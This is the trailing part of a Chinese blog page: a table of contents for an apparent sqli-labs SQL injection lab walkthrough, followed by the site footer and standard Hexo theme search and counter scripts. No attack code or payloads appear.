class="nav-text">sqlmap</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-22"><span class="nav-number">19.2.2.</span> <span class="nav-text">Less-22</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-23"><span class="nav-number">19.2.3.</span> <span class="nav-text">Less-23</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-24"><span class="nav-number">19.2.4.</span> <span class="nav-text">Less-24</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#代码分析"><span class="nav-number">19.2.4.1.</span> <span class="nav-text">代码分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#思路分析"><span class="nav-number">19.2.4.2.</span> <span class="nav-text">思路分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#步骤演示"><span class="nav-number">19.2.4.3.</span> <span class="nav-text">步骤演示</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25"><span class="nav-number">19.2.5.</span> <span class="nav-text">Less-25</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#双写嵌套绕过"><span class="nav-number">19.2.5.1.</span> <span class="nav-text">双写嵌套绕过</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#符号替换"><span class="nav-number">19.2.6.</span> <span class="nav-text">符号替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-25a"><span class="nav-number">19.2.7.</span> <span class="nav-text">Less-25a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26"><span class="nav-number">19.2.8.</span> <span class="nav-text">Less-26</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-26a"><span class="nav-number">19.2.9.</span> <span class="nav-text">Less-26a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27"><span class="nav-number">19.2.10.</span> <span class="nav-text">Less-27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-27a"><span class="nav-number">19.2.11.</span> <span class="nav-text">Less-27a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28"><span class="nav-number">19.2.12.</span> <span class="nav-text">Less-28</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-28a"><span class="nav-number">19.2.13.</span> <span class="nav-text">Less-28a</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-29"><span class="nav-number">19.2.14.</span> <span class="nav-text">Less-29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-30"><span class="nav-number">19.2.15.</span> <span class="nav-text">Less-30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-31"><span class="nav-number">19.2.16.</span> <span class="nav-text">Less-31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-32"><span class="nav-number">19.2.17.</span> <span class="nav-text">Less-32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-33"><span class="nav-number">19.2.18.</span> <span class="nav-text">Less-33</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-34"><span class="nav-number">19.2.19.</span> <span class="nav-text">Less-34</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-35"><span class="nav-number">19.2.20.</span> <span class="nav-text">Less-35</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-36"><span class="nav-number">19.2.21.</span> <span class="nav-text">Less-36</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-37"><span class="nav-number">19.2.22.</span> <span class="nav-text">Less-37</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#堆叠注入-38-53-关"><span class="nav-number">19.3.</span> <span class="nav-text">堆叠注入 38-53 关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原理介绍"><span class="nav-number">19.3.1.</span> <span class="nav-text">原理介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#局限性"><span class="nav-number">19.3.1.1.</span> <span class="nav-text">局限性</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#各个数据库堆叠查询实例"><span class="nav-number">19.3.2.</span> <span class="nav-text">各个数据库堆叠查询实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-38"><span class="nav-number">19.3.3.</span> <span class="nav-text">Less-38</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLog-数据外带"><span class="nav-number">19.3.3.1.</span> <span class="nav-text">DNSLog 数据外带</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#开启日志-Getshell"><span class="nav-number">19.3.3.2.</span> <span class="nav-text">开启日志 Getshell</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-39"><span class="nav-number">19.3.4.</span> <span class="nav-text">Less-39</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-40"><span class="nav-number">19.3.5.</span> <span class="nav-text">Less-40</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-41"><span class="nav-number">19.3.6.</span> <span class="nav-text">Less-41</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-42"><span class="nav-number">19.3.7.</span> <span class="nav-text">Less-42</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-43"><span class="nav-number">19.3.8.</span> <span class="nav-text">Less-43</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-44"><span class="nav-number">19.3.9.</span> <span class="nav-text">Less-44</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-45"><span class="nav-number">19.3.10.</span> <span class="nav-text">Less-45</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-46"><span class="nav-number">19.3.11.</span> <span class="nav-text">Less-46</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#验证方式"><span class="nav-number">19.3.11.1.</span> <span class="nav-text">验证方式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入1-2"><span class="nav-number">19.3.11.2.</span> <span class="nav-text">报错注入1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入2-2"><span class="nav-number">19.3.11.3.</span> <span class="nav-text">报错注入2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注-2"><span class="nav-number">19.3.11.4.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#延时盲注-2"><span class="nav-number">19.3.11.5.</span> <span class="nav-text">延时盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#into-outfile"><span class="nav-number">19.3.11.6.</span> <span class="nav-text">into outfile</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-47"><span class="nav-number">19.3.12.</span> <span class="nav-text">Less-47</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-48"><span class="nav-number">19.3.13.</span> <span class="nav-text">Less-48</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-49"><span class="nav-number">19.3.14.</span> <span class="nav-text">Less-49</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-50"><span class="nav-number">19.3.15.</span> <span class="nav-text">Less-50</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-51"><span class="nav-number">19.3.16.</span> <span class="nav-text">Less-51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-52"><span class="nav-number">19.3.17.</span> <span class="nav-text">Less-52</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-53"><span class="nav-number">19.3.18.</span> <span class="nav-text">Less-53</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#进阶挑战-54-65-关"><span class="nav-number">19.4.</span> <span class="nav-text">进阶挑战 54-65 关</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-54"><span class="nav-number">19.4.1.</span> <span class="nav-text">Less-54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-55"><span class="nav-number">19.4.2.</span> <span class="nav-text">Less-55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-56"><span class="nav-number">19.4.3.</span> <span class="nav-text">Less-56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-57"><span class="nav-number">19.4.4.</span> <span class="nav-text">Less-57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-58"><span class="nav-number">19.4.5.</span> <span class="nav-text">Less-58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-59"><span class="nav-number">19.4.6.</span> <span class="nav-text">Less-59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-60"><span class="nav-number">19.4.7.</span> <span class="nav-text">Less-60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-61"><span class="nav-number">19.4.8.</span> <span class="nav-text">Less-61</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-62"><span class="nav-number">19.4.9.</span> <span class="nav-text">Less-62</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-63"><span class="nav-number">19.4.10.</span> <span class="nav-text">Less-63</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-64"><span class="nav-number">19.4.11.</span> <span class="nav-text">Less-64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Less-65"><span class="nav-number">19.4.12.</span> <span class="nav-text">Less-65</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">离沫凌天๓</span>

  
</div>

<!--

  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>

-->

<div class="busuanzi-count">
    <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="site-uv">
      <i class="fa fa-user"></i>
    来访人数：<span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 
    </span>
    <div class="powered-by"></div>
    <span class="site-uv">
      <i class="fa fa-eye"></i>
    访问次数：<span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
    </span>
    <!-- 博客字数统计 -->
    <span class="site-pv">
      <i class="fa fa-pencil"></i>
    全站字数：<span class="post-count">115.9k</span>
    </span>
</div>





<div class="BbeiAn-info">
   	<!--津ICP备  -->
    <a target="_blank" href="http://www.beian.miit.gov.cn/" style="color:#f0d784" rel="nofollow">津ICP备18005284</a> <!--a标签中增加nofollow属性，避免爬虫出站。-->| 
	<a target="_blank" href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12011102000578" style="color:#f0d784;text-decoration:none;padding-left:30px;background:url(https://s1.ax1x.com/2018/09/29/ilmwIH.png) no-repeat left center" rel="nofollow">津公网安备12011102000578号</a>	  <!--这里将图标作为了背景，以使得能和后面的文字在同一行-->
</div>

<!--

  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>

-->



<!-- 在网页底部添加网站运行时间 -->
<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("05/21/2019 00:00:00");//此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "Run for "+dnum+" Days ";
        document.getElementById("times").innerHTML = hnum + " Hours " + mnum + " m " + snum + " s";
    }
setInterval("createtime()",250);
</script>
        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  






  
  







  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/three.min.js"></script>
  

  
  
    <script type="text/javascript" src="/lib/three/canvas_lines.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  


  <script type="text/javascript" src="/js/src/clicklove.js"></script>

</body>
</html>
